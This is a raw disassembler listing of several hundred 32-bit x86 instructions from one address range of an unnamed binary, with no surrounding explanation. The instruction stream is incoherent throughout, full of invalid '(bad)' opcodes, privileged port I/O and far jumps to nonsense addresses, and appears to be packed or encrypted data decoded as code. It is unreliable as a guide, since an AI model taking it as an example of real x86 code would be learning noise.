  40f5b5:	fistp  DWORD PTR [esi-0x7b5a8025]
  40f5bb:	mov    cl,0x5
  40f5bd:	iret   
  40f5be:	mov    esp,0x665d838f
  40f5c3:	pop    ss
  40f5c4:	bound  esp,QWORD PTR [edx+0x31]
  40f5c7:	(bad)
  40f5ca:	aaa    
  40f5cb:	cmp    eax,eax
  40f5cd:	dec    ebx
  40f5ce:	or     al,0xbd
  40f5d0:	sub    al,0x7d
  40f5d2:	rcr    BYTE PTR [eax],1
  40f5d4:	or     ebp,DWORD PTR [ecx+0x153d8c8a]
  40f5da:	push   esi
  40f5db:	(bad)  
  40f5dc:	cwde   
  40f5dd:	xor    eax,0x30c58267
  40f5e2:	(bad)  
  40f5e3:	xor    esi,ebp
  40f5e5:	inc    esp
  40f5e6:	cld    
  40f5e7:	dec    edi
  40f5e8:	mov    al,ds:0xf12fac56
  40f5ed:	test   BYTE PTR [edi-0x6b44127a],al
  40f5f3:	cld    
  40f5f4:	dec    edx
  40f5f5:	jnp    0x40f659
  40f5f7:	dec    ecx
  40f5f8:	jmp    0x40f60c
  40f5fa:	adc    eax,DWORD PTR [edi+0x3]
  40f5fd:	mov    WORD PTR [esi],ds
  40f5ff:	xchg   ebp,eax
  40f600:	lods   eax,DWORD PTR ds:[esi]
  40f601:	push   edx
  40f602:	retf   
  40f603:	and    ah,dh
  40f605:	fwait
  40f606:	push   edx
  40f607:	adc    DWORD PTR [edx],ebx
  40f609:	sub    ah,BYTE PTR gs:[ebp-0x4f379444]
  40f610:	rol    DWORD PTR [ebp+0xa695dfe],cl
  40f616:	shl    esp,0xd4
  40f619:	push   ebp
  40f61a:	outs   dx,BYTE PTR ds:[esi]
  40f61b:	xor    eax,0xa0eace0e
  40f620:	in     eax,dx
  40f621:	lods   al,BYTE PTR ds:[esi]
  40f622:	in     eax,dx
  40f623:	repnz mov ss,WORD PTR [eiz*8+0x18b11628]
  40f62b:	arpl   WORD PTR [eax+0x3c039a],bx
  40f631:	test   al,0xe3
  40f633:	sub    eax,0xefe41523
  40f638:	sbb    eax,0xafb8be98
  40f63d:	xor    DWORD PTR [eax+0x1cb28fd],esi
  40f643:	jo     0x40f67b
  40f645:	fwait
  40f646:	sahf   
  40f647:	inc    edx
  40f648:	sti    
  40f649:	gs push ecx
  40f64b:	inc    edi
  40f64c:	sub    BYTE PTR [eax+edi*4],0xe0
  40f650:	mov    edi,DWORD PTR [esi+0x672709f9]
  40f656:	retf   0xb796
  40f659:	or     eax,esp
  40f65b:	adc    eax,0xa0fa08df
  40f660:	sbb    BYTE PTR [edi+0x57],al
  40f663:	and    al,0xe0
  40f665:	xchg   DWORD PTR [ecx+0x76468ab],esi
  40f66b:	mov    cl,0xd4
  40f66d:	mov    al,fs:0xc96ffa57
  40f673:	push   ds
  40f674:	js     0x40f638
  40f676:	jb     0x40f63c
  40f678:	inc    ebp
  40f679:	cmp    al,0x97
  40f67b:	fdivr  QWORD PTR [ebp+0x855daa7]
  40f681:	adc    al,0x82
  40f683:	repnz aad 0x98
  40f686:	xor    dh,dl
  40f688:	pop    ecx
  40f689:	xchg   esp,eax
  40f68a:	mov    WORD PTR [ebx-0x66],gs
  40f68d:	dec    ebp
  40f68e:	fisttp WORD PTR [edx+0x61]
  40f691:	daa    
  40f692:	scas   al,BYTE PTR es:[edi]
  40f693:	pop    ebx
  40f694:	add    BYTE PTR [ecx*1-0x55754b5a],cl
  40f69b:	rcl    DWORD PTR [ebx],cl
  40f69d:	pop    ss
  40f69e:	pop    ss
  40f69f:	sub    al,0xb6
  40f6a1:	shl    DWORD PTR [esi+edi*8+0x23],cl
  40f6a5:	cli    
  40f6a6:	jo     0x40f68a
  40f6a8:	cmp    dh,BYTE PTR [edx]
  40f6aa:	scas   eax,DWORD PTR es:[edi]
  40f6ab:	fwait
  40f6ac:	dec    esi
  40f6ae:	jp     0x40f6ab
  40f6b0:	arpl   cx,ax
  40f6b2:	mov    dl,0xe2
  40f6b4:	and    edx,DWORD PTR [ebp-0x60d53f2b]
  40f6ba:	adc    al,0xd0
  40f6bc:	push   eax
  40f6bd:	ins    DWORD PTR es:[edi],dx
  40f6be:	daa    
  40f6bf:	sbb    al,0x1e
  40f6c1:	rcr    BYTE PTR [edx-0xa],0x4c
  40f6c5:	mov    esp,gs
  40f6c7:	xlat   BYTE PTR ds:[ebx]
  40f6c8:	pop    ebp
  40f6c9:	fbstp  TBYTE PTR [edx-0x68c10dcf]
  40f6cf:	cmp    BYTE PTR [ebx-0x16b6c2a3],bl
  40f6d5:	cmp    eax,0x8945f356
  40f6da:	cmp    BYTE PTR [edx],al
  40f6dc:	inc    esi
  40f6dd:	sub    eax,0x93009dab
  40f6e2:	(bad)  
  40f6e3:	lds    esp,FWORD PTR [ebp+0x4b]
  40f6e6:	and    edx,DWORD PTR [edi+0x3d]
  40f6e9:	dec    esi
  40f6ea:	adc    ebp,edx
  40f6ec:	shl    DWORD PTR [ecx+0x4d],0xd4
  40f6f0:	push   esi
  40f6f1:	out    dx,al
  40f6f2:	iret   
  40f6f3:	int    0x23
  40f6f5:	pop    eax
  40f6f6:	push   edi
  40f6f7:	mov    ecx,0x8c03bfae
  40f6fc:	mov    esp,0x12d59053
  40f701:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f702:	push   edx
  40f703:	ins    BYTE PTR es:[edi],dx
  40f704:	fcom   QWORD PTR [edi+edx*1+0x506ceecc]
  40f70b:	(bad)  
  40f70c:	test   DWORD PTR ds:0xb2035a3a,0x98d747dd
  40f716:	push   ss
  40f717:	dec    ecx
  40f718:	mov    eax,0x5980730f
  40f71d:	sbb    al,0x17
  40f71f:	cs scas eax,DWORD PTR es:[edi]
  40f721:	jl     0x40f751
  40f723:	fcom   DWORD PTR [edx+0x4e]
  40f726:	gs adc eax,0xe89788fc
  40f72c:	xchg   esi,eax
  40f72d:	stc    
  40f72e:	je     0x40f75b
  40f730:	ss push cs
  40f732:	xor    cl,BYTE PTR [eax+0x5b]
  40f735:	inc    ecx
  40f736:	lahf   
  40f737:	push   ebx
  40f738:	adc    ebp,edi
  40f73a:	pusha  
  40f73b:	out    0x8d,eax
  40f73d:	dec    edx
  40f73e:	jge    0x40f76f
  40f740:	in     al,0x24
  40f742:	mov    bl,0xb7
  40f744:	stos   DWORD PTR es:[edi],eax
  40f745:	test   BYTE PTR [eax+eax*4-0x48],al
  40f749:	test   eax,0xf10bc33e
  40f74e:	sub    DWORD PTR ds:[eax],ecx
  40f751:	fistp  QWORD PTR [esi-0x3d3c3ddc]
  40f757:	mov    dh,0xfb
  40f759:	in     eax,dx
  40f75a:	jp     0x40f716
  40f75c:	inc    eax
  40f75d:	out    0xb0,eax
  40f75f:	test   al,0xd9
  40f761:	inc    ecx
  40f762:	mov    ah,0xd1
  40f764:	dec    ebp
  40f765:	mov    eax,0x74edf189
  40f76a:	out    0x57,eax
  40f76c:	mov    DWORD PTR [esi],esp
  40f76e:	push   cs
  40f76f:	cli    
  40f770:	fsub   DWORD PTR [esi+0x6ed19a96]
  40f776:	imul   ebx,DWORD PTR [ecx-0x162e06cd],0x99c7733a
  40f780:	sbb    ebx,DWORD PTR [esi+0x5fe737bf]
  40f786:	pop    esp
  40f787:	cmp    eax,0x71083e04
  40f78c:	mov    ch,0x11
  40f78e:	ss ins DWORD PTR es:[edi],dx
  40f790:	icebp  
  40f791:	pushf  
  40f792:	neg    BYTE PTR [ebx+0x54]
  40f795:	or     al,0x91
  40f797:	out    0xc7,al
  40f799:	jge    0x40f78f
  40f79b:	inc    ebx
  40f79c:	outs   dx,DWORD PTR ds:[esi]
  40f79d:	or     DWORD PTR [ebx-0x19],esp
  40f7a0:	adc    esp,DWORD PTR [edx]
  40f7a2:	xchg   ecx,eax
  40f7a3:	lods   eax,DWORD PTR ds:[esi]
  40f7a4:	adc    al,0x91
  40f7a6:	(bad)  
  40f7a7:	jne    0x40f7c1
  40f7a9:	stos   BYTE PTR es:[edi],al
  40f7aa:	inc    ecx
  40f7ab:	add    eax,0x50e9a46d
  40f7b0:	cmp    ebp,edx
  40f7b2:	mov    cl,0x24
  40f7b4:	jl     0x40f7d4
  40f7b6:	mov    ch,0x3d
  40f7b8:	cs js  0x40f78b
  40f7bb:	and    BYTE PTR [esi+0x20],dh
  40f7be:	sbb    eax,0xe6287929
  40f7c3:	jmp    0xd7e6fc89
  40f7c8:	loope  0x40f7ed
  40f7ca:	push   ebp
  40f7cb:	and    DWORD PTR [eax-0x20a1b5ab],eax
  40f7d1:	jae    0x40f7e3
  40f7d3:	dec    ebp
  40f7d4:	push   ebp
  40f7d5:	xor    BYTE PTR [eax],bl
  40f7d7:	cmp    bl,BYTE PTR [eax-0x45]
  40f7da:	add    ah,BYTE PTR [edi-0x80]
  40f7dd:	xor    ch,BYTE PTR [esi-0x2e2c5b05]
  40f7e3:	xor    cl,dl
  40f7e5:	add    BYTE PTR [ecx],al
  40f7e7:	and    bh,ch
  40f7e9:	fstp   QWORD PTR [edx]
  40f7eb:	mov    ebp,0x3ecb23db
  40f7f0:	dec    eax
  40f7f1:	adc    al,0x49
  40f7f3:	rcl    cl,1
  40f7f5:	pushf  
  40f7f6:	in     eax,0x61
  40f7f8:	(bad)  
  40f7f9:	shl    dl,1
  40f7fb:	popf   
  40f7fc:	sub    eax,0x6186b3f6
  40f801:	cli    
  40f802:	dec    ebp
  40f803:	xor    bh,bh
  40f805:	cmc    
  40f806:	cmp    cl,BYTE PTR [esi+0x18]
  40f809:	push   0xffffffb3
  40f80b:	out    0x96,al
  40f80d:	std    
  40f80e:	mov    ebx,0x55af1bc2
  40f813:	ins    DWORD PTR es:[edi],dx
  40f814:	push   eax
  40f815:	call   0x5c4c:0xafbbe6f3
  40f81c:	retf   
  40f81d:	pop    edx
  40f81e:	or     esp,DWORD PTR [ebp-0x37]
  40f821:	outs   dx,BYTE PTR ds:[esi]
  40f822:	push   edx
  40f823:	icebp  
  40f824:	mov    edx,0x75d81ef3
  40f829:	cli    
  40f82a:	and    DWORD PTR [ebx-0x61c906d8],eax
  40f830:	lods   eax,DWORD PTR ds:[esi]
  40f831:	jmp    0x2972f67f
  40f836:	hlt    
  40f837:	clc    
  40f838:	(bad)  
  40f83a:	jbe    0x40f833
  40f83c:	fild   DWORD PTR [eax+0x5]
  40f83f:	push   0xffffffe9
  40f841:	push   es
  40f842:	push   0xb7477077
  40f847:	sahf   
  40f848:	leavew 
  40f84a:	fxch   st(2)
  40f84c:	mov    dh,0xd3
  40f84e:	icebp  
  40f84f:	call   0xa838:0x6d083885
  40f856:	pop    es
  40f857:	mov    al,dh
  40f859:	cli    
  40f85a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f85b:	jge    0x40f872
  40f85d:	call   0x87f6:0x48f774db
  40f864:	xchg   ebp,eax
  40f865:	fst    DWORD PTR [edi+0x53]
  40f868:	arpl   WORD PTR [ebx],si
  40f86a:	pop    ebx
  40f86b:	imul   edi,DWORD PTR [ebx+0x74809e35],0xc14d7693
  40f875:	je     0x40f85e
  40f877:	and    esp,DWORD PTR [esi]
  40f879:	loope  0x40f889
  40f87b:	jo     0x40f822
  40f87d:	clc    
  40f87e:	dec    esi
  40f87f:	test   eax,0xbf42aa4b
  40f884:	aaa    
  40f885:	shl    DWORD PTR [edi+0x6a84ffbb],cl
  40f88b:	push   eax
  40f88c:	xor    dl,BYTE PTR [ecx-0x330c6b71]
  40f892:	xchg   ebx,eax
  40f893:	in     eax,dx
  40f894:	mov    bl,0x27
  40f896:	stos   DWORD PTR es:[edi],eax
  40f897:	ins    DWORD PTR es:[edi],dx
  40f898:	pop    ebx
  40f899:	dec    ebx
  40f89a:	(bad)  
  40f89b:	retf   0x4baf
  40f89e:	adc    bl,BYTE PTR [esi+edi*1+0x7e]
  40f8a2:	add    DWORD PTR [eax+ecx*8+0x77d1520a],ecx
  40f8a9:	mov    cl,0xc
  40f8ab:	shl    DWORD PTR [ebp+0x3fbadac1],1
  40f8b1:	and    eax,ecx
  40f8b3:	mov    esp,0xfdebc40d
  40f8b8:	add    al,0x65
  40f8ba:	scas   al,BYTE PTR es:[edi]
  40f8bb:	pop    edi
  40f8bc:	xor    esp,DWORD PTR [ebp-0x24350890]
  40f8c2:	xor    eax,0x1bd6e84b
  40f8c7:	cmp    edi,DWORD PTR [ebx-0x736c188]
  40f8cd:	std    
  40f8ce:	mov    eax,0xcc2fa519
  40f8d3:	in     al,dx
  40f8d4:	dec    edi
  40f8d5:	dec    DWORD PTR [esi]
  40f8d7:	es pop ss
  40f8d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8da:	adc    DWORD PTR [esi],esi
  40f8dc:	in     al,dx
  40f8dd:	loopne 0x40f8a2
  40f8df:	push   ebp
  40f8e0:	dec    BYTE PTR [edi+0x32323923]
  40f8e6:	jg     0x40f964
  40f8e8:	pushf  
  40f8e9:	hlt    
  40f8ea:	ror    DWORD PTR [edx],cl
  40f8ec:	or     BYTE PTR [ecx+0x42],dl
  40f8ef:	call   0x4c5ba993
  40f8f4:	retf   0x571b
  40f8f7:	loop   0x40f8cb
  40f8f9:	jmp    0x8ed7:0xc16572b
  40f900:	pop    ecx
  40f901:	int3   
  40f902:	push   ebp
  40f903:	mov    eax,ds:0xe715e729
  40f908:	inc    esi
  40f909:	inc    edx
  40f90a:	and    eax,0x5f3e877c
  40f90f:	nop
  40f910:	out    0x98,eax
  40f912:	lahf   
  40f913:	(bad)  
  40f915:	jg     0x40f8ca
  40f917:	imul   ebx,DWORD PTR [edx+0x5a],0x19e951e7
  40f91e:	mov    DWORD PTR [edx],eax
  40f920:	inc    ebp
  40f921:	mov    edi,0xe898fd75
  40f926:	ds dec edi
  40f928:	jbe    0x40f8fe
  40f92a:	cmp    al,0xe
  40f92c:	dec    eax
  40f92d:	xchg   ecx,eax
  40f92e:	sub    eax,0xef214bc7
  40f933:	aas    
  40f934:	popf   
  40f935:	sbb    BYTE PTR [edx+0x14],dl
  40f938:	(bad)  
  40f939:	mov    ebx,0x6aa4fde8
  40f93e:	cwde   
  40f93f:	sub    edx,ebx
  40f941:	lods   al,BYTE PTR ds:[esi]
  40f942:	and    al,0x7
  40f944:	jmp    0x40f99b
  40f946:	icebp  
  40f947:	fild   QWORD PTR [esi-0x175334c9]
  40f94d:	xchg   ebp,eax
  40f94e:	or     DWORD PTR ds:0x5204a894,ebx
  40f954:	mov    ah,0xd4
  40f956:	and    BYTE PTR [edi-0x66779d7b],al
  40f95c:	adc    BYTE PTR [ebp-0x5],bl
  40f95f:	(bad)  
  40f960:	js     0x40f971
  40f962:	jg     0x40f917
  40f964:	sub    ebx,DWORD PTR [edx+0x62]
  40f967:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f968:	mov    ch,0x11
  40f96a:	push   ebx
  40f96b:	clc    
  40f96c:	jne    0x40f9d3
  40f96e:	add    al,0x3f
  40f970:	add    edi,edx
  40f972:	or     BYTE PTR [ecx+0x4e],al
  40f975:	jmp    0x40f9b4
  40f977:	mov    edi,0xe80eb1
  40f97c:	ins    DWORD PTR es:[edi],dx
  40f97d:	inc    edi
  40f97e:	out    dx,al
  40f97f:	push   ebp
  40f980:	pop    ecx
  40f981:	push   ebp
  40f982:	fwait
  40f983:	add    dh,BYTE PTR [esi+edx*8-0x5d]
  40f987:	push   ebx
  40f988:	scas   eax,DWORD PTR es:[edi]
  40f989:	jnp    0x40f996
  40f98b:	add    eax,DWORD PTR [eax-0x7b]
  40f98e:	fs fdivp st(2),st
  40f991:	outs   dx,DWORD PTR ds:[esi]
  40f992:	shl    BYTE PTR [ecx],cl
  40f994:	jo     0x40f980
  40f996:	out    0xea,al
  40f998:	push   ebp
  40f999:	das    
  40f99a:	lods   al,BYTE PTR ds:[esi]
  40f99b:	push   esi
  40f99c:	pop    ecx
  40f99d:	push   cs
  40f99e:	fisttp WORD PTR [edi]
  40f9a0:	clc    
  40f9a1:	jle    0x40f97f
  40f9a3:	imul   esp,edx,0x3c
  40f9a6:	mov    ch,0x3e
  40f9a8:	outs   dx,BYTE PTR ds:[esi]
  40f9a9:	push   edx
  40f9aa:	int3   
  40f9ab:	and    al,BYTE PTR [edi+edx*4-0x58]
  40f9af:	js     0x40f97e
  40f9b1:	dec    esi
  40f9b2:	sbb    esi,DWORD PTR [eax]
  40f9b4:	jmp    0xc5a2:0x765ab233
  40f9bb:	sbb    eax,0xe396f0a1
  40f9c0:	pop    ebx
  40f9c1:	dec    edx
  40f9c2:	xchg   esi,eax
  40f9c3:	dec    edx
  40f9c4:	cmp    BYTE PTR [edx],al
  40f9c6:	dec    eax
  40f9c7:	push   ebp
  40f9c8:	(bad)  
  40f9c9:	jmp    0x40f98a
  40f9cb:	fucomi st,st(5)
  40f9cd:	cdq    
  40f9ce:	test   ch,al
  40f9d0:	cmp    al,0xfb
  40f9d2:	sub    esp,eax
  40f9d4:	push   ss
  40f9d5:	imul   edx,DWORD PTR [esi+0x57b1cba0],0xc7b44c9f
  40f9df:	sbb    DWORD PTR [ecx-0x61],ebx
  40f9e2:	loopne 0x40fa28
  40f9e4:	scas   al,BYTE PTR es:[edi]
  40f9e5:	xor    DWORD PTR [edx+ebx*8],eax
  40f9e8:	push   0xec20d1c9
  40f9ed:	inc    edx
  40f9ee:	popa   
  40f9ef:	mov    eax,ds:0xe909f5b0
  40f9f4:	rol    DWORD PTR [esi+0x1ff7fa9b],cl
  40f9fa:	js     0x40fa14
  40f9fc:	ja     0x40f9cf
  40f9fe:	jmp    0x40fa6d
  40fa00:	dec    edi
  40fa01:	dec    ecx
  40fa02:	js     0x40f9ab
  40fa04:	mov    bl,0xec
  40fa06:	add    edx,DWORD PTR ds:0xf9407f01
  40fa0c:	lea    ecx,[edi]
  40fa0e:	loop   0x40fa3f
  40fa10:	mov    gs,WORD PTR [ebx]
  40fa12:	cmc    
  40fa13:	sbb    cl,bl
  40fa15:	mov    ecx,0x89827aa4
  40fa1a:	cmp    al,0xf5
  40fa1c:	loope  0x40f9e2
  40fa1e:	scas   eax,DWORD PTR es:[edi]
  40fa1f:	mov    edx,0x835ded06
  40fa24:	or     BYTE PTR [eax+0x11],bh
  40fa27:	mov    al,ds:0x51d77105
  40fa2c:	jo     0x40fa28
  40fa2e:	pop    ebp
  40fa2f:	js     0x40fa77
  40fa31:	xchg   edi,edx
  40fa33:	jg     0x40f9f4
  40fa35:	ffreep st(7)
  40fa37:	fneni(8087 only) 
  40fa39:	pop    ss
  40fa3a:	fdivp  st(3),st
  40fa3c:	pop    edx
  40fa3d:	iret   
  40fa3e:	cmp    dh,cl
  40fa40:	xor    esp,DWORD PTR [edx+0x68d878f3]
  40fa46:	mov    bl,0xa1
  40fa48:	xchg   esi,eax
  40fa49:	leave  
  40fa4a:	inc    esp
  40fa4b:	and    DWORD PTR [edx],ebp
  40fa4d:	mov    dl,BYTE PTR [edx+0x6d]
  40fa50:	stos   DWORD PTR es:[edi],eax
  40fa51:	addr16 das 
  40fa53:	jo     0x40fa12
  40fa55:	ins    BYTE PTR es:[edi],dx
  40fa56:	xor    DWORD PTR [edx],0x2f29d7d
  40fa5c:	mov    ds:0x7fef9f82,al
  40fa61:	ins    DWORD PTR es:[edi],dx
  40fa62:	sahf   
  40fa63:	and    al,0xae
  40fa65:	fs push ebp
  40fa67:	and    DWORD PTR [edi+ebp*2+0xf],0xe0dedcee
  40fa6f:	ss add al,0x19
  40fa72:	test   bh,al
  40fa74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa75:	aas    
  40fa76:	shl    DWORD PTR [edx+0x4],cl
  40fa79:	cwde   
  40fa7a:	mov    WORD PTR [esi],cs
  40fa7c:	xchg   edx,eax
  40fa7d:	ja     0x40fa7b
  40fa7f:	(bad)
  40fa83:	dec    edx
  40fa84:	fdivr  QWORD PTR [ebp+0x1c2e4236]
  40fa8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa8b:	in     al,0x7e
  40fa8d:	(bad)  
  40fa8e:	mov    ebp,DWORD PTR [edx]
  40fa90:	or     BYTE PTR [ecx-0x41],0x84
  40fa94:	mov    edi,0xaba400e7
  40fa99:	cmp    BYTE PTR [edi-0x60c67955],cl
  40fa9f:	mov    eax,ds:0xc35ecd75
  40faa4:	cmp    DWORD PTR [esi-0x40ffc277],esi
  40faaa:	data16 xor ah,BYTE PTR [ecx-0x737cf940]
  40fab1:	mov    ds:0xa8c1053f,eax
  40fab6:	addr16 jle 0x40fb08
  40fab9:	jmp    0xd924a238
  40fabe:	int3   
  40fabf:	mov    eax,ds:0x446c0755
  40fac4:	loopne 0x40fa7f
  40fac6:	and    al,0x67
  40fac8:	mov    dl,0x47
  40faca:	fsub   DWORD PTR [esi+edx*1-0x4a]
  40face:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40facf:	push   ebp
  40fad0:	aam    0xef
  40fad2:	pop    ebx
  40fad3:	(bad)  
  40fad4:	sbb    cl,ch
  40fad6:	ret    
  40fad7:	xlat   BYTE PTR ds:[ebx]
  40fad8:	aaa    
  40fad9:	mov    bl,0x22
  40fadb:	cli    
  40fadc:	enter  0x5521,0x3d
  40fae0:	adc    esp,DWORD PTR [edx+ebx*1+0x3e]
  40fae4:	dec    esp
  40fae5:	repnz mov ch,0x6d
  40fae8:	jl     0x40fb11
  40faea:	inc    ecx
  40faeb:	into   
  40faec:	jecxz  0x40fb35
  40faee:	inc    esi
  40faef:	fsubr  DWORD PTR [ebp-0x7d]
  40faf2:	push   0xffffffc8
  40faf4:	dec    esi
  40faf5:	or     edi,edi
  40faf7:	ins    BYTE PTR es:[edi],dx
  40faf8:	scas   eax,DWORD PTR es:[edi]
  40faf9:	mov    ss,WORD PTR [ecx-0x8]
  40fafc:	mov    bh,0x9c
  40fafe:	scas   eax,DWORD PTR es:[edi]
  40faff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb00:	dec    eax
  40fb01:	sub    esp,0x56a2954c
  40fb07:	sti    
  40fb08:	dec    ecx
  40fb09:	aas    
  40fb0a:	icebp  
  40fb0b:	or     bl,BYTE PTR [ebx]
  40fb0d:	iret   
  40fb0e:	xor    DWORD PTR [esi],edx
  40fb10:	pusha  
  40fb11:	test   eax,0x2f589f6e
  40fb16:	mov    ?,WORD PTR [ebx+edx*2+0x545d39b4]
  40fb1d:	or     eax,0x6e61bc48
  40fb22:	or     eax,0x5ada1be9
  40fb27:	sub    esp,DWORD PTR [ecx+0x6]
  40fb2a:	cwde   
  40fb2b:	add    eax,0xe7842261
  40fb30:	jmp    0x40fbac
  40fb32:	retf   
  40fb33:	test   DWORD PTR ds:0x7f2331a3,edi
  40fb39:	mov    esi,0xc78e9272
  40fb3e:	xor    BYTE PTR [eax],0xb2
  40fb41:	test   al,0x1b
  40fb43:	mov    bl,0x1f
  40fb45:	mov    ah,0xaf
  40fb47:	sbb    al,0x4a
  40fb49:	add    BYTE PTR [esi+0x242b8235],cl
  40fb4f:	js     0x40fb5d
  40fb51:	inc    edi
  40fb52:	sub    al,0x7d
  40fb54:	push   esi
  40fb55:	shr    DWORD PTR [esi+edi*1],0x2d
  40fb59:	jmp    0x6bc419e1
  40fb5e:	jle    0x40fbab
  40fb60:	ja     0x40fb25
  40fb62:	sbb    DWORD PTR [eax-0x7f],eax
  40fb65:	rol    dh,1
  40fb67:	and    al,0xfc
  40fb69:	popa   
  40fb6a:	jo     0x40fb28
  40fb6c:	or     bh,ah
  40fb6e:	push   0xe77ea149
  40fb73:	mov    ah,bl
  40fb75:	adc    DWORD PTR [esi+0x57],ebx
  40fb78:	lahf   
  40fb79:	mov    BYTE PTR [ecx],bl
  40fb7b:	xlat   BYTE PTR ds:[ebx]
  40fb7c:	dec    edi
  40fb7d:	xchg   ebp,eax
  40fb7e:	adc    bl,BYTE PTR [ecx-0x1]
  40fb81:	clc    
  40fb82:	popf   
  40fb83:	test   eax,0x81c203f5
  40fb88:	in     eax,0xfb
  40fb8a:	mov    dh,al
  40fb8c:	pop    ebp
  40fb8d:	enter  0xb8b,0x9b
  40fb91:	lock outs dx,DWORD PTR ds:[esi]
  40fb93:	fxch   st(5)
  40fb95:	in     al,0xdd
  40fb97:	je     0x40fbcd
  40fb99:	(bad)  
  40fb9a:	jg     0x40fc12
  40fb9c:	fsubp  st(5),st
  40fb9e:	hlt    
  40fb9f:	outs   dx,DWORD PTR ds:[esi]
  40fba0:	cmp    BYTE PTR [eax-0x6b59f441],bh
  40fba6:	ret    
  40fba7:	stos   DWORD PTR es:[edi],eax
  40fba8:	loop   0x40fbc2
  40fbaa:	inc    edx
  40fbab:	adc    bl,dh
  40fbad:	add    eax,0x2db38a9f
  40fbb2:	ror    DWORD PTR [ecx-0x3deddcd8],cl
  40fbb8:	xchg   DWORD PTR [edx-0x165866c0],ebx
  40fbbe:	and    dh,BYTE PTR [edx+ebx*8]
  40fbc1:	pop    ds
  40fbc2:	dec    eax
  40fbc3:	lock push eax
  40fbc5:	popa   
  40fbc6:	jge    0x40fb4b
  40fbc8:	ret    
  40fbc9:	ins    BYTE PTR es:[edi],dx
  40fbca:	jg     0x40fb87
  40fbcc:	sbb    ebp,edi
  40fbce:	retf   0x28c5
  40fbd1:	lods   al,BYTE PTR ds:[esi]
  40fbd2:	and    cl,BYTE PTR [esi]
  40fbd4:	push   ebx
  40fbd5:	cli    
  40fbd6:	mov    bl,0x3
  40fbd8:	inc    esp
  40fbd9:	ins    BYTE PTR es:[edi],dx
  40fbda:	mov    edi,ebp
  40fbdc:	ins    DWORD PTR es:[edi],dx
  40fbdd:	nop
  40fbde:	cmova  ebx,DWORD PTR [edx-0x77]
  40fbe2:	rcl    bl,0x7c
  40fbe5:	dec    esp
  40fbe6:	and    ecx,esp
  40fbe8:	lods   al,BYTE PTR ds:[esi]
  40fbea:	adc    al,0x63
  40fbec:	sar    BYTE PTR [ebp-0x24058f12],1
  40fbf2:	jb     0x40fbe5
  40fbf4:	sar    BYTE PTR [edx],0xb3
  40fbf7:	cdq    
  40fbf8:	hlt    
  40fbf9:	out    0x8a,eax
  40fbfb:	iret   
  40fbfc:	xor    eax,0xa625e3
  40fc01:	and    al,0x52
  40fc03:	sub    BYTE PTR [ebx-0x2e816a3],dl
  40fc09:	loope  0x40fbb5
  40fc0b:	dec    eax
  40fc0c:	je     0x40fc15
  40fc0e:	fstp   st(3)
  40fc10:	jbe    0x40fc81
  40fc12:	push   ss
  40fc13:	sbb    eax,0xf592c0ec
  40fc18:	pusha  
  40fc19:	xor    ebp,DWORD PTR [edi]
  40fc1b:	(bad)  
  40fc1c:	mov    bl,0x5c
  40fc1e:	inc    edi
  40fc1f:	sbb    DWORD PTR [ecx],ebx
  40fc21:	add    eax,0x1bce1fb6
  40fc26:	lods   al,BYTE PTR ds:[esi]
  40fc27:	xchg   esi,eax
  40fc28:	dec    esp
  40fc29:	mov    dh,BYTE PTR [esi+esi*2-0x28]
  40fc2d:	ja     0x40fc76
  40fc2f:	xor    BYTE PTR [edx-0x2ceb81c2],ah
  40fc35:	mov    WORD PTR [eax],cs
  40fc37:	sub    ebx,esi
  40fc39:	div    BYTE PTR [ecx]
  40fc3b:	(bad)  
  40fc3c:	mov    edx,0x376c494c
  40fc41:	mov    cl,BYTE PTR [edx+esi*4]
  40fc44:	pop    edi
  40fc45:	imul   DWORD PTR [esi]
  40fc47:	aam    0x44
  40fc49:	add    al,0xce
  40fc4b:	xchg   edi,eax
  40fc4c:	fistp  QWORD PTR [edx-0x193de7c1]
  40fc52:	sbb    BYTE PTR [esi-0x20],dh
  40fc55:	ficom  DWORD PTR [ebp+0x6f]
  40fc58:	(bad)  
  40fc59:	shl    BYTE PTR [ecx-0x2948fbfe],1
  40fc5f:	idiv   ch
  40fc61:	test   BYTE PTR [ebx+0x7e18430d],bl
  40fc67:	add    al,0xc4
  40fc69:	mov    dh,cl
  40fc6b:	inc    edi
  40fc6c:	int3   
  40fc6d:	fwait
  40fc6e:	inc    edi
  40fc6f:	fiadd  WORD PTR [eax-0x68]
  40fc72:	lea    ecx,ds:0xbb6f8e5b
  40fc78:	fadd   QWORD PTR [eax+0x281ee83a]
  40fc7e:	loopne 0x40fc19
  40fc80:	dec    esp
  40fc81:	ins    DWORD PTR es:[edi],dx
  40fc82:	das    
  40fc83:	mov    DWORD PTR [ebx-0x6d],ebp
  40fc86:	fidivr DWORD PTR [edx]
  40fc88:	dec    eax
  40fc89:	and    al,0x6a
  40fc8b:	adc    eax,0xb9ba6a8e
  40fc90:	cmp    BYTE PTR [edx-0x42],ah
  40fc93:	repnz in eax,0x42
  40fc96:	cmp    cl,BYTE PTR [edi+0x20]
  40fc99:	shr    BYTE PTR [edi-0x4b],0xfd
  40fc9d:	nop
  40fc9e:	aaa    
  40fc9f:	xor    DWORD PTR [esi+0x40233dbe],edi
  40fca5:	cdq    
  40fca6:	repnz mov al,0x3e
  40fca9:	mov    bl,0x28
  40fcab:	add    ebp,DWORD PTR [eax]
  40fcad:	xchg   bx,ax
  40fcaf:	sub    BYTE PTR [eax-0x6cf8a085],bl
  40fcb5:	push   cs
  40fcb6:	lods   eax,DWORD PTR ds:[si]
  40fcb8:	pop    edi
  40fcb9:	push   edx
  40fcba:	enter  0x4096,0xb3
  40fcbe:	jno    0x40fc8a
  40fcc0:	xchg   ah,bh
  40fcc2:	inc    esp
  40fcc3:	xchg   DWORD PTR [edx+0x11],ebp
  40fcc6:	xor    al,0x39
  40fcc8:	std    
  40fcc9:	mov    dh,BYTE PTR [esi]
  40fccb:	retf   0xe5fa
  40fcce:	mov    bh,0xd9
  40fcd0:	xchg   edx,eax
  40fcd1:	loopne 0x40fca9
  40fcd3:	dec    esi
  40fcd4:	rcl    BYTE PTR [ebx+ecx*2-0x67],cl
